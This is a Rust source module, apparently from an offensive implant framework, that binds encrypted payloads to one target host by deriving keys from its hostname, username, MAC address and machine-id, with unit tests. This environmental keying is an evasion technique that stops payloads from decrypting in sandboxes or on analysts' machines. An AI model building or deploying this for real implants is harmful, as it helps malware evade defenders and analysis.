//! Environment-keyed payload encryption.
//!
//! Derives encryption keys from host environment properties (hostname,
//! username, MAC address, etc.), binding payloads to specific targets.
//! The agent can only decrypt and execute on the intended host.

use crate::crypto::{self, CryptoError, EncryptionKey};

/// Properties used to derive an environment key
#[derive(Debug, Clone)]
pub struct EnvKeyMaterial {
    /// Hostname (uname -n or gethostname)
    pub hostname: Option<String>,
    /// Username (whoami or getuid)
    pub username: Option<String>,
    /// MAC address of primary interface
    pub mac_address: Option<String>,
    /// Machine ID (/etc/machine-id on Linux)
    pub machine_id: Option<String>,
    /// Custom salt for additional binding
    pub custom_salt: Option<String>,
}

impl EnvKeyMaterial {
    /// Collect environment properties from the current host
    pub fn from_current_host() -> Self {
        Self {
            hostname: get_hostname(),
            username: get_username(),
            mac_address: get_mac_address(),
            machine_id: get_machine_id(),
            custom_salt: None,
        }
    }

    /// Create from explicit values (for operator-side encryption)
    pub fn from_values(hostname: Option<&str>, username: Option<&str>,
                       mac: Option<&str>, machine_id: Option<&str>) -> Self {
        Self {
            hostname: hostname.map(|s| s.to_string()),
            username: username.map(|s| s.to_string()),
            mac_address: mac.map(|s| s.to_lowercase().replace(['-', ' '], ":")),
            machine_id: machine_id.map(|s| s.trim().to_string()),
            custom_salt: None,
        }
    }

    /// Returns true if at least one binding property is set
    pub fn has_bindings(&self) -> bool {
        self.hostname.is_some() || self.username.is_some()
            || self.mac_address.is_some() || self.machine_id.is_some()
            || self.custom_salt.is_some()
    }

    /// Derive a 256-bit key from the environment properties.
    /// Panics if no binding properties are set (use has_bindings() to check).
    pub fn derive_key(&self, master_key: &EncryptionKey) -> EncryptionKey {
        assert!(self.has_bindings(), "EnvKeyMaterial must have at least one binding property");
        let mut hasher = blake3::Hasher::new_keyed(master_key);
        hasher.update(b"obfuse-envkey-v1:");
        if let Some(ref h) = self.hostname {
            hasher.update(b"host:");
            hasher.update(h.as_bytes());
            hasher.update(b"\x00");
        }
        if let Some(ref u) = self.username {
            hasher.update(b"user:");
            hasher.update(u.as_bytes());
            hasher.update(b"\x00");
        }
        if let Some(ref m) = self.mac_address {
            hasher.update(b"mac:");
            hasher.update(m.to_lowercase().as_bytes());
            hasher.update(b"\x00");
        }
        if let Some(ref mid) = self.machine_id {
            hasher.update(b"mid:");
            hasher.update(mid.as_bytes());
            hasher.update(b"\x00");
        }
        if let Some(ref s) = self.custom_salt {
            hasher.update(b"salt:");
            hasher.update(s.as_bytes());
        }
        let hash = hasher.finalize();
        let mut key = [0u8; 32];
        key.copy_from_slice(hash.as_bytes());
        key
    }

    /// Summarize which properties are bound (for logging)
    pub fn binding_summary(&self) -> String {
        let mut parts = Vec::new();
        if self.hostname.is_some() { parts.push("hostname"); }
        if self.username.is_some() { parts.push("username"); }
        if self.mac_address.is_some() { parts.push("mac"); }
        if self.machine_id.is_some() { parts.push("machine-id"); }
        if self.custom_salt.is_some() { parts.push("custom-salt"); }
        if parts.is_empty() { "none".into() } else { parts.join("+") }
    }
}

/// Encrypt data bound to a specific environment
pub fn env_encrypt(data: &[u8], master_key: &EncryptionKey, env: &EnvKeyMaterial) -> Result<Vec<u8>, CryptoError> {
    let derived = env.derive_key(master_key);
    crypto::encrypt(&derived, data)
}

/// Decrypt data using the current environment (fails if env doesn't match)
pub fn env_decrypt(data: &[u8], master_key: &EncryptionKey, env: &EnvKeyMaterial) -> Result<Vec<u8>, CryptoError> {
    let derived = env.derive_key(master_key);
    crypto::decrypt(&derived, data)
}

fn get_hostname() -> Option<String> {
    #[cfg(unix)]
    {
        let mut buf = [0u8; 256];
        let ret = unsafe { libc::gethostname(buf.as_mut_ptr() as *mut _, buf.len()) };
        if ret == 0 {
            let len = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
            Some(String::from_utf8_lossy(&buf[..len]).to_string())
        } else {
            None
        }
    }
    #[cfg(not(unix))]
    { std::env::var("COMPUTERNAME").ok() }
}

fn get_username() -> Option<String> {
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .or_else(|_| std::env::var("USERNAME"))
        .ok()
}

fn get_mac_address() -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        // Read from /sys/class/net/*/address, skip lo.
        // Sort interface names for deterministic selection across reboots.
        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
            let mut ifaces: Vec<String> = entries.flatten()
                .map(|e| e.file_name().to_string_lossy().to_string())
                .filter(|name| name != "lo")
                .collect();
            ifaces.sort();

            for name in ifaces {
                let path = std::path::Path::new("/sys/class/net").join(&name).join("address");
                if let Ok(mac) = std::fs::read_to_string(&path) {
                    let mac = mac.trim().to_string();
                    if !mac.is_empty() && mac != "00:00:00:00:00:00" {
                        return Some(mac);
                    }
                }
            }
        }
        None
    }
    #[cfg(not(target_os = "linux"))]
    { None }
}

fn get_machine_id() -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string("/etc/machine-id")
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    }
    #[cfg(not(target_os = "linux"))]
    { None }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_derive_key_deterministic() {
        let master = [0x42u8; 32];
        let env = EnvKeyMaterial::from_values(
            Some("target-host"), Some("admin"), None, None,
        );
        let key1 = env.derive_key(&master);
        let key2 = env.derive_key(&master);
        assert_eq!(key1, key2);
    }

    #[test]
    fn test_different_env_different_key() {
        let master = [0x42u8; 32];
        let env1 = EnvKeyMaterial::from_values(Some("host-a"), None, None, None);
        let env2 = EnvKeyMaterial::from_values(Some("host-b"), None, None, None);
        assert_ne!(env1.derive_key(&master), env2.derive_key(&master));
    }

    #[test]
    fn test_env_encrypt_decrypt_roundtrip() {
        let master = [0x42u8; 32];
        let env = EnvKeyMaterial::from_values(Some("myhost"), Some("user"), None, None);
        let plaintext = b"secret payload data here";

        let encrypted = env_encrypt(plaintext, &master, &env).unwrap();
        let decrypted = env_decrypt(&encrypted, &master, &env).unwrap();
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_wrong_env_fails_decrypt() {
        let master = [0x42u8; 32];
        let env_real = EnvKeyMaterial::from_values(Some("target"), None, None, None);
        let env_wrong = EnvKeyMaterial::from_values(Some("wrong-host"), None, None, None);

        let encrypted = env_encrypt(b"secret", &master, &env_real).unwrap();
        let result = env_decrypt(&encrypted, &master, &env_wrong);
        assert!(result.is_err());
    }

    #[test]
    fn test_binding_summary() {
        let env = EnvKeyMaterial::from_values(Some("host"), Some("user"), None, None);
        assert_eq!(env.binding_summary(), "hostname+username");
    }

    #[test]
    fn test_from_current_host() {
        // Just ensure it doesn't panic
        let env = EnvKeyMaterial::from_current_host();
        let _ = env.binding_summary();
    }
}
